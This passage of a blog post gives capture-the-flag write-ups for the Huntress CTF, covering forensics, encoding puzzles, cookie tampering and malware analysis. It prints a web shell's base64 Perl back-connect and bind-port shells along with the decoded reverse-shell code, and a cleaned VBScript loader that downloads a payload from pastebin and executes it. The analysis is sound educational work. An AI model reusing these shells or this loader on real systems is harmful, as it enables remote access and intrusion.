</span></span><span class=line><span class=cl>	<span class=nv>$back_connect_p</span><span class=o>=</span><span class=s2>&#34;IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$bind_port_p</span><span class=o>=</span><span class=s2>&#34;IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s2>&#34;&lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt;
</span></span></span><span class=line><span class=cl><span class=s2>	&lt;form name=&#39;nfp&#39; onSubmit=</span><span class=se>\&#34;</span><span class=s2>g(null,null,&#39;bpp&#39;,this.port.value);return false;</span><span class=se>\&#34;</span><span class=s2>&gt;
</span></span></span><span class=line><span class=cl><span class=s2>[...]
</span></span></span><span class=line><span class=cl><span class=s2>   
</span></span></span></code></pre></div></code></pre><p>By decoding the base64 we get two pieces of code, the most interesting one is this one :<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>#!/usr/bin/perl
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>use</span> <span class=nx>Socket</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$iaddr</span><span class=o>=</span><span class=nx>inet_aton</span><span class=p>(</span><span class=nv>$ARGV</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Error: $!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$paddr</span><span class=o>=</span><span class=nx>sockaddr_in</span><span class=p>(</span><span class=nv>$ARGV</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$iaddr</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Error: $!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$proto</span><span class=o>=</span><span class=nx>getprotobyname</span><span class=p>(</span><span class=s1>&#39;tcp&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>(</span><span class=nx>SOCKET</span><span class=p>,</span> <span class=nx>PF_INET</span><span class=p>,</span> <span class=nx>SOCK_STREAM</span><span class=p>,</span> <span class=nv>$proto</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Error: $!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>connect</span><span class=p>(</span><span class=nx>SOCKET</span><span class=p>,</span> <span class=nv>$paddr</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Error: $!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>open</span><span class=p>(</span><span class=nx>STDIN</span><span class=p>,</span> <span class=s2>&#34;&gt;&amp;SOCKET&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>open</span><span class=p>(</span><span class=nx>STDOUT</span><span class=p>,</span> <span class=s2>&#34;&gt;&amp;SOCKET&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>open</span><span class=p>(</span><span class=nx>STDERR</span><span class=p>,</span> <span class=s2>&#34;&gt;&amp;SOCKET&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>my</span> <span class=nv>$str</span> <span class=o>=</span> <span class=o>&lt;&lt;</span><span class=nx>END</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>begin</span> <span class=mi>644</span> <span class=nx>uuencode</span><span class=o>.</span><span class=nx>uu</span>
</span></span><span class=line><span class=cl><span class=nx>F9FQA9WLY8C5C</span><span class=o>-</span><span class=c1>#,Q,V0Q,CDU.#,U-&amp;)E-C(X-&amp;9C9#8S9&amp;0R-GT`
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>`</span>
</span></span><span class=line><span class=cl><span class=nx>end</span>
</span></span><span class=line><span class=cl><span class=nx>END</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;/bin/sh -i -c &#34;echo ${string}; bash&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>close</span><span class=p>(</span><span class=nx>STDIN</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>close</span><span class=p>(</span><span class=nx>STDOUT</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>close</span><span class=p>(</span><span class=nx>STDERR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   
</span></span></code></pre></div></p><p>In there we can see a uuencoded strings that we need to decode and here is the flag !</p><p><em>flag: flag{9b5c4313d12958354be6284fcd63dd26}</em></p><h2 id=dialtone>Dialtone</h2><p>We are provided with a wav file looking like dialtones in a phone.
Using dtmf we are able to extract the corresponding string.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/dialtone.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/dialtone.png, https://www.hato0.xyz/images/ctf/huntress/dialtone.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/dialtone.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/dialtone.png title=Dialtone></p><p>This looks like a long that we need to convert to strings.</p><p>We can use the following code snippet :<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=mi>13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573</span>
</span></span><span class=line><span class=cl><span class=nb>bytes</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>)</span></span></span></code></pre></div></p><p>That return the flag !</p><p><em>flag: flag{6c733ef09bc4f2a4313ff63087e25d67}</em></p><h2 id=layered-security>Layered Security</h2><p>Using the <code>file</code> command we are seing that the file is in fact a GIMP file.
Opening it in GIMP give us multiple images and on one of them display the flag.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/layered.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/layered.png, https://www.hato0.xyz/images/ctf/huntress/layered.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/layered.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/layered.png title=Layered></p><p><em>flag: flag{9a64bc4a390cb0ce31452820ee562c3f}</em></p><h2 id=backdoored-splunk>Backdoored Splunk</h2><p>For this challenge we had two materials provided: a website and a zip file.</p><p>Inside the zip we can see the code of a splunk agent for windows machine.
When navigating to the website, the following message was deplayed :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk.png, https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk.png title=Splunk></p><p>Giving the fact that it requires an Authorization header and that we have sources maybe we can find the token inside it.
Using grep on the files, we find the appropriate token.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk2.png, https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk2.png title=Splunk></p><p>Using this token with curl we can just access the website and get a base64 string.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk3.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk3.png, https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk3.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk3.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/backdoorSplunk3.png title=Splunk></p><p>This base64 is in fact the flag !</p><p><em>flag: flag{60bb3bfaf703e0fa36730ab70e115bd7}</em></p><h2 id=dumpster-fire>Dumpster Fire</h2><p>We are presented with a linux file system.
Dumping the <code>passwd</code> file we can spot a user named <code>Challenge</code>.</p><p>Navigating to it we can identify a mozilla repertory and nothing else interesing.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/dumpster.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/dumpster.png, https://www.hato0.xyz/images/ctf/huntress/dumpster.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/dumpster.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/dumpster.png title=dumpster></p><p>From there we can identify the profile and find the login.json file with encrypted credentials.
Using a <a href=https://github.com/unode/firefox_decrypt target=_blank rel="noopener noreffer">firefox decoder</a> we can extract the corresponding password and have the flag !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/dumpster2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/dumpster2.png, https://www.hato0.xyz/images/ctf/huntress/dumpster2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/dumpster2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/dumpster2.png title=dumpster></p><p><em>flag: flag{35446041dc161cf5c9c325a3d28af3e3}</em></p><h2 id=comprezz>Comprezz</h2><p>This chall is really straightforward. You just need to add the <code>zip</code> extension to the given file and extract the content to read the flag !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/comprezz.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/comprezz.png, https://www.hato0.xyz/images/ctf/huntress/comprezz.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/comprezz.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/comprezz.png title=dumpster></p><p><em>flag: flag{196a71490b7b55c42bf443274f9ff42b}</em></p><h2 id=where-am-i>Where am I?</h2><p>This chall is not a real OSINT challenge so don&rsquo;t go down that way.
Analyzing the file properties we can find some base64 in the Title.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/whereami.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/whereami.png, https://www.hato0.xyz/images/ctf/huntress/whereami.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/whereami.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/whereami.png title=whereami></p><p>Decoding this base64 we get a flag !</p><p><em>flag: flag{b11a3f0ef4bc170ba9409c077355bba2)</em></p><h2 id=chicken-wings>Chicken Wings</h2><p>For this chall we have a string composed by emojies.
The string is the following : <code>♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝</code></p><p>Typing google &rsquo;emoji to text decode&rsquo;, we were able to find the following <a href=https://lingojam.com/WingDing target=_blank rel="noopener noreffer">website</a>.</p><p>Using this website, the decoding goes good and got the flag !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/chicken.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/chicken.png, https://www.hato0.xyz/images/ctf/huntress/chicken.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/chicken.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/chicken.png title=chicken></p><p><em>flag: flag{e0791ce68f718188c0378b1c0a3bdc9e}</em></p><h2 id=wimble>Wimble</h2><p>This challenge start with a ZIP file. Extracting the content we find a Windows Imaging file.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/wimble.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/wimble.png, https://www.hato0.xyz/images/ctf/huntress/wimble.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/wimble.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/wimble.png title=wimble></p><p>Extracting it got the PF files that we need to analyze as we will do in forensic thing (after all that&rsquo;s a blue team oriented CTF).</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/wimble2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/wimble2.png, https://www.hato0.xyz/images/ctf/huntress/wimble2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/wimble2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/wimble2.png title=wimble></p><p>Using PECmd we are able to analyze those PF files. Greping to the output searching for flag we are able to get it.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/wimble3.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/wimble3.png, https://www.hato0.xyz/images/ctf/huntress/wimble3.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/wimble3.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/wimble3.png title=wimble></p><p><em>flag: flag{97f33c9783c21df85d79d613b0b258bd}</em></p><h2 id=f12>F12</h2><p>This chall is the first chall with no resource and only a distant webserver.</p><p>We have a web page with a button calling the function <code>ctf()</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/F12.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/F12.png, https://www.hato0.xyz/images/ctf/huntress/F12.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/F12.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/F12.png title=F12></p><p>This function open a new window with a specific path :</p><pre><code><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>ctf</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;./capture_the_flag.html&#34;</span><span class=p>,</span> <span class=s1>&#39;Capture The Flag&#39;</span><span class=p>,</span> <span class=s1>&#39;width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></code></pre><p>Accessing directly to the page we get the flag !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/F122.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/F122.png, https://www.hato0.xyz/images/ctf/huntress/F122.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/F122.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/F122.png title=F12></p><p><em>flag: flag{03e8ba07d1584c17e69ac95c341a2569}</em></p><h2 id=veebeeeee>VeeBeeEee</h2><p>From the introduction we know that the downloaded file as something to do with wmiscripts.</p><p>Checking it we can actually see the magic bytes of <code>VBE</code> files (<code>#@~^</code>).
We will from there try to decode the content. To do so we will use the program done by one of the CTF author located in <a href=https://github.com/JohnHammond/vbe-decoder/blob/master/vbe-decoder.py target=_blank rel="noopener noreffer">github</a>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/veebee.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/veebee.png, https://www.hato0.xyz/images/ctf/huntress/veebee.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/veebee.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/veebee.png title=veebee></p><p>I will not but the uncleaned code here to protect your eyes but here is a cleanup version :</p><pre><code><pre tabindex=0><code class=language-visualbasic data-lang=visualbasic>Set Object  = WScript.CreateObject(&#34;WScript.Shell&#34;) 
Set SObject = CreateObject(&#34;Shell.Application&#34;)
Set FObject = CreateObject(&#34;Scripting.FileSystemObject&#34;)
SPath   = WScript.ScriptFullName
Dim Code

Power = &#34;PowerShell &#34;
Path = &#34;$f=&#39;C:\Users\Public\Documents\July.htm&#39;;&#34;
Reqest = &#34;if (!(Test-Path $f)){Invoke-WebRequest &#39;https://pastebin.com/raw/SiYGwwcz&#39; -outfile $f  };&#34;
PathString = SObject.NameSpace(7).Self.Path  &#34;/&#34;  WScript.ScriptName
InvokeReqest = &#34;[System.Reflection.Assembly]::loadfile($f);&#34;
ExecAssem = &#34;[WorkArea.Work]::Exe()&#34;
CollectThenReplace Power , Path , Reqest , InvokeReqest , ExecAssem
Return = Object.Run(Code, 0, true)
WScript.Sleep(50000)
For i = 1 To 5
if i = 5 Then
Paste(SPath)
End if
Next
Sub Paste(RT)
FObject.CopyFile RT,PathString
End Sub</code></pre></code></pre><p>The code perform an request to a <code>pastebin</code> then save the output to <code>July.htm</code> in the public document folder and execute it.
Visiting the pastebin, the flag is the only content.</p><p><em>flag: flag{ed81d24958127a2adccfb343012cebff}</em></p><h2 id=baking>Baking</h2><p>This challenge is using only a remote service.</p><p>By connecting to it, an oven is display with some recipes with long times to cook.
We can see a cookie <code>in_oven</code> registered when we submit a recipe.
<img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/backing.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/backing.png, https://www.hato0.xyz/images/ctf/huntress/backing.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/backing.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/backing.png title=backing></p><p>Decoding this cookie we obtain the following json: <code>{"recipe": "Carrot Cake", "time": "10/11/2023, 15:07:08"}</code>.
So that means we have the hand on the recipe and the time that it has been submitted.
Moving from there we will try the <code>Magic Cookie</code> recipe and set a very old date, encoding back to base64 and update the cookie.
The send cookie is : <code>{"recipe": "Magic Cookies", "time": "10/11/2000, 15:07:08"}:eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEwLzExLzIwMDAsIDE1OjA3OjA4In0=</code>.</p><p>Got the flag when refreshed.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/backing2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/backing2.png, https://www.hato0.xyz/images/ctf/huntress/backing2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/backing2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/backing2.png title=backing></p><p><em>flag: flag{c36fb6ebdbc2c44e6198bf4154d94ed4}</em></p><h2 id=snake-oil>Snake Oil</h2><p>Learning from previous mistake, static analysis is fun but not really efficient.</p><p>So for this chall given the executable we have we will go ahead and run it on a sandbox.
We directly got the flag through the Ngrok process</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/snakeOil.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/snakeOil.png, https://www.hato0.xyz/images/ctf/huntress/snakeOil.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/snakeOil.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/snakeOil.png title=snakeOil></p><p><em>flag: flag{d7267ce26203b5cc69f4bab679cc78d2}</em></p><h2 id=crab>Crab</h2><p>So we are presented with a DLL and a lnk exuting the DLL with the entry point DLLMain.</p><p>Decompiling it we can quickly check the exports functions.
3 functions are interesting, DLLMain, NtCheckOSArchitecture and TlsCallback_X.</p><p>Might indicate some external communication perform by the DLL for TlsCallback_X.
For NtCheckOSArchitecture, it should set some execution condition that we will probably need to meet to check the file dinamically.</p><p>But we will start with DLLMain.
The DLLMain only seems to call NtCheckOSArchitecture.</p><p>Exploring it we found method.crab_rave::inject_flag.h5274a20ed59aab7d that seems to be the function printing the flag.</p><p>rAcbUUWWNFlqMbruiYOIsAyVQHS78orvMoJ8C6O4D3asAApB
-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-rr5-r</p><p>URL is stored in argv 3 of the reqwest::blocking::get.h91579b36988f2767
Called by void method.crab_rave::inject_flag.h5274a20ed59aab7</p><p>Unfortunately I do not have screen for the rest but essentially you have a decript function called with arguments. Those arguments represent the key and the date to decode. You have to look in memory for the data and just decode it (that&rsquo;s a AES encoding and a base64).</p><h1 id=conclusion>Conclusion</h1><p>This was a fun CTF, done with collegues. We finished up to the 49 place and manage to solve all the challenges. Thanks for this CTF Huntress !</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-12-17&nbsp;<a class=git-hash href=https://github.com/Hato0/hato0.github.io/commit/890a3ec8c2dcb01ed6de02b103318733b3d76d27 target=_blank title="commit by Hato0(contact@hato0.xyz) 890a3ec8c2dcb01ed6de02b103318733b3d76d27: update code snipped to match Hugo requirements">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>890a3ec</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://www.hato0.xyz/posts/ctf/huntress/ data-title="CTF: Huntress CTF" data-hashtags=blueteam,redteam,ctf,development><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://www.hato0.xyz/posts/ctf/huntress/ data-hashtag=blueteam><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://www.hato0.xyz/posts/ctf/huntress/ data-title="CTF: Huntress CTF"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://www.hato0.xyz/posts/ctf/huntress/ data-title="CTF: Huntress CTF"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://www.hato0.xyz/posts/ctf/huntress/ data-title="CTF: Huntress CTF"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/blueteam/>Blueteam</a>,&nbsp;<a href=/tags/redteam/>Redteam</a>,&nbsp;<a href=/tags/ctf/>Ctf</a>,&nbsp;<a href=/tags/development/>Development</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/penetration_testing/bountease/ class=prev rel=prev title="Bountease: a BugBounty recon script"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Bountease: a BugBounty recon script</a>
<a href=/posts/blue_team/owlguard/ class=next rel=next title="OwlGuard: A multi-instance SIEM rule manager.">OwlGuard: A multi-instance SIEM rule manager.<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>hato0 dedicated blog @2022</div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>